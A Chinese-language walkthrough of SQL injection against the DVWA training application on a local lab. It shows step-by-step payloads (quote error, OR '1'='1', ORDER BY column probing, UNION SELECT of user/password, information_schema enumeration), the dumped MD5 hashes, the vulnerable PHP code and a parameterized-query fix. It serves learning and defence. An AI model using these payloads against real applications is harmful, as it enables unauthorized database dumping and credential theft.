# DVWA SQL Injection（Low）从确认到拖库

> 靶场：DVWA（Damn Vulnerable Web Application）
> 模块：SQL Injection，安全等级 Low
> 环境：Kali Linux 2026.2（VirtualBox）+ PHP 内置服务器 + MariaDB
> 日期：2026-10-21
> 性质：**本地授权靶场，仅用于学习**

---

## 一、目标

在本地 DVWA 靶场上，从零确认一个 SQL 注入点，并最终拖出 `users` 表的用户名与密码哈希，理解漏洞成因与修复方式。

## 二、环境

| 项 | 内容 |
|---|---|
| 虚拟机 | VirtualBox + Kali Linux 2026.2（4 核 / 4096MB） |
| Web 服务器 | `php -S 0.0.0.0:8080`（PHP 内置服务器） |
| 数据库 | MariaDB，库名 `dvwa`，用户 `dvwa` |
| 访问地址 | `http://127.0.0.1:8080` |
| 登录 | `admin` / `password` |

> 环境备注：DVWA 是直接下载源码解压运行的；数据库连接写在 `config/config.inc.php`。

---

## 三、复现过程

### 3.1 正常请求

页面是 `User ID` 输入框。先输入正常数字：

```
1
```

返回：

```
ID: 1
First name: admin
Surname: admin
```

说明输入被带进了数据库查询。

### 3.2 加单引号，确认注入点

输入：

```
1'
```

返回数据库报错：

```
You have an error in your SQL syntax; check the manual that corresponds
to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

**报错 = 参数被原样拼进了 SQL 语句。** 到这里就可以确认存在注入点。

### 3.3 让条件恒真，拖出全表

输入：

```
1' OR '1'='1
```

结果一次返回 5 条记录：admin、Gordon Brown、Hack Me、Pablo Picasso、Bob Smith。

原理：查询条件被改写成 `user_id = '1' OR '1'='1'`，恒为真。

### 3.4 探测列数

依次输入：

```
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#
```

- 第 1、2 条正常返回
- 第 3 条报错：`Unknown column '3' in 'ORDER BY'`

**说明查询结果只有 2 列。**

> `#` 是 MySQL 注释符，把原本语句后面的 `'` 和 `LIMIT 1` 注释掉，保证注入语句完整执行。

### 3.5 UNION 拖库

输入：

```
1' UNION SELECT user, password FROM users#
```

返回结果（节选）：

| 用户名 | 哈希 |
|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` |
| gordonb | `e99a18c428cb38d5f260853678922e03` |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` |

**一个输入框，拖出了整张用户表的账号和密码哈希。**

---

## 三·五、复盘四问

### 推理链（为什么这么做）

**第 1 步：为什么先输入 `1`**

- 我在想：先看正常请求长什么样，才有「基线」。
- 验证：返回 admin 的信息。
- 所以：输入确实进入了查询。

**第 2 步：为什么加一个单引号**

- 我在想：如果输入被原样拼进 SQL，多一个引号会破坏语法 → 报错就是注入点。
- 验证：`1'` → MariaDB 语法错误。
- 所以：**报错 = 拼接存在**，注入点确认。

**第 3 步：为什么先试 `' OR '1'='1`**

- 我在想：恒真条件能证明「我能改查询逻辑」，而不只是触发报错。
- 验证：一次返回 5 条记录。
- 所以：注入可利用，不只是报错。

**第 4 步：为什么要用 `ORDER BY n` 探列数**

- 我在想：UNION 要求列数一致，报错信息会告诉我「有没有第 n 列」。
- 验证：`ORDER BY 1/2` 正常，`ORDER BY 3` 报 `Unknown column '3'`。
- 所以：原查询 2 列，UNION 也要 2 列。

**第 5 步：为什么用 `#` 截断**

- 我在想：原语句后面还有 `' AND ...`，不注释掉 UNION 就不完整。
- 验证：`1' UNION SELECT user,password FROM users#` 成功。
- 所以：`#`（或 `-- `）是让注入语句「收尾干净」的关键。

### 载荷是怎么来的

- **来源**：手工逐条输入，无脚本。
- **列数为什么是 2**：由 `ORDER BY` 报错反推。
- **UNION 的两列**：`user`、`password` 恰好对应页面的 `first_name`、`last_name` 显示位。

### 逐段解释

| 载荷 | 作用 |
|---|---|
| `1'` | 制造语法错误，确认拼接 |
| `1' OR '1'='1` | 让 WHERE 恒真，返回全表 |
| `1' ORDER BY n#` | 探测列数 |
| `1' UNION SELECT user,password FROM users#` | 把敏感列顶到显示位 |

### 失败尝试与坑

| 现象 | 原因 | 解决 |
|---|---|---|
| 提交 `1'` 直接 500 | PHP 8.1+ mysqli 默认抛异常 | `auto_prepend_file` 关掉 `MYSQLI_REPORT` |
| Docker 拉 DVWA 超时 | 国内网络不稳 | 改系统包 php + mariadb |
| 粘贴出 `zsh: bad pattern` | 终端把粘贴转义序列当命令 | `Shift+Ctrl+V` 或手输 |

### 自测

**Q1**：为什么 `1'` 报错就说明有注入？
**A**：单引号破坏了 SQL 语法，说明输入被原样拼进语句。

**Q2**：`ORDER BY 3` 报错说明了什么？
**A**：原查询只有 2 列，UNION 必须对齐 2 列。

**Q3**：`#` 在这里的作用？
**A**：注释掉原语句剩余部分，让注入的 UNION 完整执行。

## 四、原理分析

DVWA Low 级别的源码核心只有两行：

```php
$id = $_GET[ 'id' ];
$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

用户输入**没有经过任何校验、没有参数化**，被直接拼进 SQL 字符串。

所以输入 `1'` 时，实际执行的是：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'';
```

多出来的单引号破坏了语法 → 报错。

输入 `1' OR '1'='1` 时：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

条件恒真 → 全表返回。

输入 `1' UNION SELECT user, password FROM users#` 时：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION SELECT user, password FROM users#' LIMIT 1;
```

`#` 把后面注释掉，UNION 把账号和密码顶到 `first_name`、`last_name` 两列的位置显示出来。

---

## 五、为什么这个漏洞危险

1. **可直接拖库**：攻击者不需要登录后台，一个 URL 参数就能拿走全表数据。
2. **密码哈希不是护身符**：MD5 已被彩虹表/反查表覆盖，`5f4dcc3b5aa765d61d8327deb882cf99` 就是 `password` 的 MD5，一查即知。弱密码 = 明文。
3. **可进一步提权**：注入点通常还能读文件、写文件、查 `information_schema` 拿库表结构，最终可能导致服务器失守。

```sql
-- 继续深入时可以用：
1' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database()#
```

---

## 六、修复建议

| 措施 | 说明 |
|---|---|
| **参数化查询（首选）** | 用 PDO / mysqli 的 `prepare` + `bindParam`，把数据当数据、不当代码 |
| 输入校验 | 如 id 必须是整数，用 `is_numeric()` 检查并强转 |
| 最小权限 | 数据库账号只给业务需要的权限，禁止 root 直连 |
| 错误信息 | 生产环境关闭详细 SQL 报错，避免泄露结构 |
| 密码存储 | 用 bcrypt / Argon2 加盐哈希，不用 MD5；数据库不存明文 |

修复后的写法（PDO 示例）：

```php
$stmt = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1');
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```

---

## 七、踩坑记录（环境问题，真实发生）

### 坑 1：PHP 8.1+ 下 DVWA 报 500 Internal Server Error

**现象**：提交 `1'` 时页面直接 500，看不到 SQL 报错。

**原因**：PHP 8.1 起 `mysqli` 默认把错误抛成异常，DVWA 老代码的 `mysqli_query(...) or die(...)` 接不住，异常未捕获导致 500。

**解决**（不改源码，用 auto_prepend 全局关掉异常模式）：

```bash
cd /tmp/DVWA-master
echo "<?php mysqli_report(MYSQLI_REPORT_OFF);" > prepend.php
sudo php -d auto_prepend_file=/tmp/DVWA-master/prepend.php -S 0.0.0.0:8080
```

### 坑 2：终端里粘贴出现 `zsh: bad pattern: [200~sudo`

**原因**：终端把粘贴逃逸序列 `[200~` 当成了命令的一部分。

**解决**：用 `Shift + Ctrl + V` 粘贴，或手动输入。

### 坑 3：Docker 拉镜像一直超时

**原因**：国内直连 Docker Hub 和几个加速器都不稳定。

**解决**：放弃 Docker，改用系统包 `php + mariadb-server`，直接跑 PHP 内置服务器，同样能完成实验。

---

## 八、收获

- 确认注入点的标准动作：**正常输入 → 加引号看报错 → 恒真条件验证**
- 列数探测：`ORDER BY n` 靠报错反推
- UNION 拖库：列数对齐后，把敏感字段顶到显示位
- 哈希 ≠ 安全：MD5 无盐值、弱密码可直接反查
- 修复的唯一正解：**参数化查询**

## 九、下一步

- [ ] XSS（反射型 / 存储型 / DOM）
- [ ] File Upload（文件上传绕过）
- [ ] SQL 盲注（布尔 / 时间）
- [ ] 用 Burp Suite 抓包复现同一套流程
- [ ] 学 `information_schema` 拖库表结构

## 十、参考

- OWASP Top 10 - A03: Injection
- DVWA 官方仓库：https://github.com/digininja/DVWA
- PortSwigger SQL Injection Cheat Sheet

---

> **安全声明**：本文所有操作均在本人本地搭建的授权靶场中完成，未针对任何未授权系统。测试真实目标前必须获得书面授权，否则可能触犯《刑法》第 285、286 条及《网络安全法》。
